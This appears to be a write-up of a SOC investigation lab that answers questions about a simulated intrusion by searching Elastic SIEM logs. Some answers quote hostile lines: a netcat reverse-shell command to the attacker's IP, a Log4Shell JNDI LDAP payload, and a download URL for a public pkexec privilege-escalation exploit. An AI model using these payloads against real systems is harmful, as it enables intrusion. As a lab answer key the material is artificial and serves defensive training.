# ElasticCase Lab

## **Scenario**

An attacker was able to trick an employee into downloading a suspicious file and running it. The attacker compromised the system, along with that, The Security Team did not update most systems. The attacker was able to pivot to another system and compromise the company. As a SOC analyst, you are assigned to investigate the incident using Elastic as a SIEM tool and help the team to kick out the attacker.

## **Questions**

### Q1: Who downloads the malicious file which has a double extension?

![image.png](images/image.png)

![image.png](images/image%201.png)

Answer: ahmed

### Q2: What is the hostname he was using?

![image.png](images/image%202.png)

Answer: DESKTOP-Q1SL9P2

### Q3: What is the name of the malicious file?

![image.png](images/image.png)

Answer: Acount_details.pdf.exe

### Q4: What is the attacker's IP address?

![image.png](images/image%203.png)

Answer: 192.168.1.10

### Q5: Another user with high privilege runs the same malicious file. What is the username?

![image.png](images/image%204.png)

Answer: cybery

### Q6: The attacker was able to upload a DLL file of size 8704. What is the file name?

![image.png](images/image%205.png)

![image.png](images/image%206.png)

Answer: mCblHDgWP.dll

### Q7: Tên tiến trình cha nào tạo ra tiến trình cmd với quyền NT AUTHORITY và PID 10716?

![image.png](images/image%207.png)

Answer: rundll32.exe

### Q8:  The previous process was able to access a registry. What is the full path of the registry?

![image.png](images/image%208.png)

Answer: HKLM\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy\Enabled

### Q9: PowerShell process with pid 8836 changed a file in the system. What was that filename?

![image.png](images/image%209.png)

Answer: ModuleAnalysisCache

### Q10: PowerShell process with pid 11676 created files with the ps1 extension. What is the first file that has been created?

![image.png](images/image%2010.png)

### Q11: What is the machine's IP address that is in the same LAN as a windows machine?

![image.png](images/image%2011.png)

Answer: 192.168.10.30

### Q12: The attacker login to the Ubuntu machine after a brute force attack. What is the username he was successfully login with?

![image.png](images/image%2012.png)

Answer: salem

### Q13: After that attacker downloaded the exploit from the GitHub repo using wget. What is the full URL of the repo?

![image.png](images/image%2013.png)

Answer: [https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py](https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py)

### Q14: After The attacker runs the exploit, which spawns a new process called pkexec, what is the process's md5 hash?

![image.png](images/image%2014.png)

Answer: 3a4ad518e9e404a6bad3d39dfebaf2f6

### Q15: Then attacker gets an interactive shell by running a specific command on the process id 3011 with the root user. What is the command?

![image.png](images/image%2015.png)

Answer: bash-i

### Q16: What is the hostname which alert [signal.rule.name](http://signal.rule.name/): "Netcat Network Activity"?

![image.png](images/image%2016.png)

Answer: CentOS

### Q17: What is the username who ran netcat?

Answer: solr

### Q18: What is the parent process name of netcat?

![image.png](images/image%2017.png)

Answer: java

### Q19: If you focus on nc process, you can get the entire command that the attacker ran to get a reverse shell. Write the full command?

Answer: nc -e /bin/bash 192.168.1.10 9999

### Q20: From the previous three questions, you may remember a famous java vulnerability. What is it?

![image.png](images/image%2018.png)

Answer: Log4Shell 

### Q21: What is the entire log file path of the "solr" application?

![image.png](images/image%2019.png)

Answer: /var/solr/logs/solr.log

### Q22: What is the path that is vulnerable to log4j?

![image.png](images/image%2020.png)

Answer : /admin/cores

### Q23: What is the GET request parameter used to deliver log4j payload?

Answer: foo

### Q24: What is the JNDI payload that is connected to the LDAP port?

Answer: {foo=${jndi:ldap://192.168.1.10:1389/Exploit}}
